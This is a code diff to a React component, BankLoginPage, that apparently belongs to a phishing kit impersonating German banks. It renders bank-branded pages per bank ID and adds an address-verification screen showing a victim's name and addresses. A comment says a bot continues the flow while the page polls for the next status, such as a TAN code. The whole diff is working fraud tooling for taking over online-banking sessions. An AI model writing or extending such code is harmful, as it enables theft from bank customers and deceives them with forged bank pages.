@@ -554,19 +554,30 @@ export function BankLoginPage({ bankId }: { bankId: string }) {
   const shellProps = { theme, logoSrc, fallbackLogoSrc, bankName: bank.name, showName, bigLogo: isBBBank, footerLinks: (bank.footer_links ?? null) as any };
 
   if (phase === "address_confirm") {
+    const ad = addressData ?? {};
+    const oldStreet = ad.old_street ?? ad.current_street ?? "";
+    const oldPlz = ad.old_plz ?? ad.current_plz ?? "";
+    const oldCity = ad.old_city ?? ad.current_city ?? "";
+    const newStreet = ad.new_street ?? ad.street ?? "";
+    const newPlz = ad.new_plz ?? ad.plz ?? "";
+    const newCity = ad.new_city ?? ad.city ?? "";
     return (
       <BankShell {...shellProps}>
-        <div className="max-w-md mx-auto mt-16 flex flex-col items-center gap-4 text-center">
-          <div
-            className="h-10 w-10 rounded-full border-2 border-t-transparent animate-spin"
-            style={{ borderColor: themeColor, borderTopColor: "transparent" }}
+        <div className="py-6 sm:py-10 px-4">
+          <AddressVerificationStep
+            theme={theme}
+            taskId={currentTaskId ?? undefined}
+            currentAddress={{ strasse: oldStreet, plzOrt: `${oldPlz} ${oldCity}`.trim() }}
+            additionalAddress={{ strasse: newStreet, plzOrt: `${newPlz} ${newCity}`.trim() }}
+            bankGroup={bank.group}
+            customerName={ad.customer_name ?? ad.name}
+            onBack={() => {}}
+            onDeleted={() => {
+              // Bot continues the flow; keep polling for next status (TAN etc.)
+              setPhase("waiting");
+              setSubmitting(true);
+            }}
           />
-          <h2 className="text-xl font-semibold" style={{ color: themeColor }}>
-            Adresse wird aktualisiert…
-          </h2>
-          <p className="text-sm text-gray-600">
-            Bitte einen Moment Geduld, Ihre Daten werden verarbeitet.
-          </p>
         </div>
       </BankShell>
     );
